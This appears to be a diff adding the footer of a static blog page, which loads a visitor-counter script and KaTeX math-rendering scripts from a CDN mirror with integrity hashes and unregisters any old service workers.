+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
